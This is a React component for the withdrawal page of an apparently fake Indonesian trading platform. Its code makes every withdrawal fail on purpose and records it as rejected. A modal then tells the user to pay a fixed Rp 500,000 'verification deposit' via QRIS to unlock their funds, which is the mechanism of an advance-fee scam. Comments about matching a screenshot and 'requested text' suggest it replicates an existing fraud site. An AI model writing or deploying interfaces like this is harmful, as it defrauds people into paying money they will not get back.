import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAccounts, useAuth } from '../../hooks/useStorage';
import { StorageService } from '../../utils/storage';
import {
  AlertCircle,
  ShieldAlert,
  ArrowRight,
  RefreshCw,
  Wallet,
  X,
  ShieldCheck,
  CheckCircle2,
} from 'lucide-react';

export const WithdrawalPage: React.FC = () => {
  const { accounts } = useAccounts();
  const { user } = useAuth();
  const navigate = useNavigate();

  const primaryAccount = accounts.find((a) => a.userId === user?.id) || accounts[0];

  const [amountIdr, setAmountIdr] = useState('50000');
  const [selectedWallet, setSelectedWallet] = useState('DANA Wallet');
  const [destAccount, setDestAccount] = useState('02928282888');
  const [loading, setLoading] = useState(false);
  const [showFailedModal, setShowFailedModal] = useState(false);

  // Conversion: 1 USD = 16,000 IDR
  const idrNum = parseFloat(amountIdr) || 0;
  const usdEquiv = (idrNum / 16000).toFixed(2);

  const handleProcessWithdrawal = (e: React.FormEvent) => {
    e.preventDefault();
    if (idrNum <= 0) return;

    setLoading(true);

    setTimeout(() => {
      setLoading(false);

      // Record attempted withdrawal transaction with failed / verification required status
      StorageService.addTransaction({
        accountId: primaryAccount?.accountNumber || '205128182',
        type: 'withdrawal',
        amount: -parseFloat(usdEquiv),
        status: 'rejected',
        description: `Penarikan Rp ${idrNum.toLocaleString('id-ID')} ke ${selectedWallet} (${destAccount}) - Tertahan: Perlu Verifikasi Deposit Ulang`,
      });

      // Open failure/verification modal
      setShowFailedModal(true);
    }, 700);
  };

  return (
    <div className="max-w-2xl mx-auto space-y-6 font-sans">
      {/* Top Header */}
      <div className="space-y-1">
        <div className="flex items-center gap-2">
          <span className="px-2.5 py-0.5 rounded-full bg-amber-100 text-amber-900 text-[10px] font-bold tracking-wide uppercase">
            Pencairan Dana Klien
          </span>
          <span className="text-xs text-neutral-500 font-mono">Server: US New York (Amerikan) Live</span>
        </div>
        <h1 className="text-xl sm:text-2xl font-bold text-neutral-900 tracking-tight">
          Penarikan Dana (Withdraw)
        </h1>
        <p className="text-xs text-neutral-500">
          Tarik saldo keuntungan trading Anda ke rekening bank atau e-wallet Indonesia.
        </p>
      </div>

      {/* Account Balance Summary Strip */}
      <div className="p-4 bg-neutral-900 text-white rounded-2xl border border-neutral-800 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-neutral-800 flex items-center justify-center text-red-500">
            <Wallet className="w-5 h-5" />
          </div>
          <div>
            <span className="text-[11px] text-neutral-400 block">Saldo Akun Tersedia</span>
            <strong className="text-base sm:text-lg font-mono text-white">
              ${primaryAccount?.balance.toLocaleString('id-ID', { minimumFractionDigits: 2 })} USD
            </strong>
          </div>
        </div>
        <span className="text-xs text-neutral-400 font-mono">
          ≈ Rp {((primaryAccount?.balance || 0) * 16000).toLocaleString('id-ID')}
        </span>
      </div>

      {/* Main Withdrawal Card - Matching Dark Style from Video/Screenshot */}
      <div className="bg-[#16181f] text-neutral-200 rounded-2xl p-6 sm:p-7 border border-neutral-800 shadow-2xl space-y-5">
        <div className="flex items-center justify-between pb-3 border-b border-neutral-800">
          <h2 className="text-base sm:text-lg font-bold text-white tracking-tight">
            Penarikan Dana (Withdraw)
          </h2>
          <button
            type="button"
            onClick={() => navigate('/dashboard')}
            className="text-neutral-400 hover:text-white transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* System Verification Yellow Note (Exact match to requested text) */}
        <div className="p-3.5 bg-amber-500/10 border border-amber-500/40 rounded-xl text-amber-300 text-xs sm:text-sm font-medium leading-relaxed shadow-inner flex items-start gap-2.5">
          <AlertCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
          <span>
            * Catatan : Untuk keamanan dan verifikasi sistem, setiap penarikan membutuhkan verifikasi deposit ulang 10% hasil profit. Wajib menggunakan rekening sesuai nama yang terdaftar.
          </span>
        </div>

        {/* Form Inputs */}
        <form onSubmit={handleProcessWithdrawal} className="space-y-4 text-xs sm:text-sm">
          {/* Nominal Penarikan */}
          <div className="space-y-1.5">
            <label className="block text-neutral-300 font-medium text-xs">
              Nominal Penarikan (Rp)
            </label>
            <div className="relative">
              <input
                type="number"
                required
                min="10000"
                step="10000"
                value={amountIdr}
                onChange={(e) => setAmountIdr(e.target.value)}
                placeholder="50000"
                className="w-full px-4 py-3 rounded-xl bg-[#20232d] border border-neutral-700 text-white font-mono font-bold text-base focus:outline-none focus:border-amber-400 transition-colors"
              />
              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-mono text-neutral-400">
                ≈ ${usdEquiv} USD
              </span>
            </div>
          </div>

          {/* Bank / E-Wallet Tujuan */}
          <div className="space-y-1.5">
            <label className="block text-neutral-300 font-medium text-xs">
              Bank / E-Wallet Tujuan
            </label>
            <select
              value={selectedWallet}
              onChange={(e) => setSelectedWallet(e.target.value)}
              className="w-full px-4 py-3 rounded-xl bg-[#20232d] border border-neutral-700 text-white text-xs sm:text-sm font-medium focus:outline-none focus:border-amber-400 transition-colors cursor-pointer"
            >
              <option value="DANA Wallet">DANA Wallet</option>
              <option value="OVO E-Wallet">OVO E-Wallet</option>
              <option value="GoPay">GoPay</option>
              <option value="ShopeePay">ShopeePay</option>
              <option value="BCA (Bank Central Asia)">BCA (Bank Central Asia)</option>
              <option value="BRI (Bank Rakyat Indonesia)">BRI (Bank Rakyat Indonesia)</option>
              <option value="Bank Mandiri">Bank Mandiri</option>
              <option value="BNI (Bank Negara Indonesia)">BNI (Bank Negara Indonesia)</option>
              <option value="Bank Syariah Indonesia (BSI)">Bank Syariah Indonesia (BSI)</option>
            </select>
          </div>

          {/* Nomor Rekening / HP */}
          <div className="space-y-1.5">
            <label className="block text-neutral-300 font-medium text-xs">
              Nomor Rekening / HP
            </label>
            <input
              type="text"
              required
              value={destAccount}
              onChange={(e) => setDestAccount(e.target.value)}
              placeholder="02928282888"
              className="w-full px-4 py-3 rounded-xl bg-[#20232d] border border-neutral-700 text-white font-mono text-xs sm:text-sm focus:outline-none focus:border-amber-400 transition-colors"
            />
          </div>

          {/* Big Yellow Process Button matching screenshot */}
          <div className="pt-2">
            <button
              type="submit"
              disabled={loading}
              className="w-full py-3.5 bg-gradient-to-r from-amber-400 to-yellow-400 hover:from-amber-300 hover:to-yellow-300 text-neutral-950 font-black text-sm uppercase tracking-wider rounded-xl transition-all shadow-lg active:scale-98 cursor-pointer disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {loading ? (
                <span>Memproses Permintaan...</span>
              ) : (
                <span>Proses Penarikan</span>
              )}
            </button>
          </div>
        </form>
      </div>

      {/* FAILED / VERIFICATION REQUIRED MODAL */}
      {showFailedModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="w-full max-w-md bg-[#16181f] border border-amber-500/50 rounded-2xl p-6 sm:p-7 shadow-2xl space-y-5 animate-scaleUp text-neutral-200">
            {/* Modal Icon & Title */}
            <div className="text-center space-y-2">
              <div className="w-14 h-14 rounded-2xl bg-amber-500/20 border border-amber-500/40 text-amber-400 flex items-center justify-center mx-auto shadow-inner">
                <ShieldAlert className="w-8 h-8" />
              </div>
              <h3 className="text-lg sm:text-xl font-black text-white tracking-tight">
                Penarikan Membutuhkan Verifikasi
              </h3>
              <p className="text-xs text-neutral-400">
                Sistem keamanan gateway mendeteksi perlunya verifikasi deposit ulang.
              </p>
            </div>

            {/* Note box */}
            <div className="p-3.5 bg-amber-500/15 border border-amber-500/40 rounded-xl text-amber-200 text-xs leading-relaxed space-y-2">
              <p className="font-semibold text-amber-300">
                * Catatan : Untuk keamanan dan verifikasi sistem, setiap penarikan membutuhkan verifikasi deposit ulang 10% hasil profit. Wajib menggunakan rekening sesuai nama yang terdaftar.
              </p>
              <p className="text-neutral-300 text-[11px]">
                Silakan lakukan deposit verifikasi sebesar <strong>Rp 500.000</strong> (10% dari hasil profit) melalui <strong>QRIS Standar</strong> untuk membuka otorisasi penarikan dana ke {selectedWallet} ({destAccount}). Wajib menggunakan rekening sesuai nama yang terdaftar.
              </p>
            </div>

            {/* Actions */}
            <div className="space-y-2.5 pt-1">
              <button
                type="button"
                onClick={() => navigate('/dashboard/deposit')}
                className="w-full py-3.5 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-bold text-xs uppercase tracking-wider rounded-xl transition-all shadow flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>Lakukan Deposit Verifikasi (QRIS Rp 500.000)</span>
                <ArrowRight className="w-4 h-4" />
              </button>

              <button
                type="button"
                onClick={() => setShowFailedModal(false)}
                className="w-full py-2.5 bg-[#20232d] hover:bg-[#2a2e3b] text-neutral-300 font-semibold text-xs rounded-xl transition-colors cursor-pointer text-center"
              >
                Tutup & Kembali
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
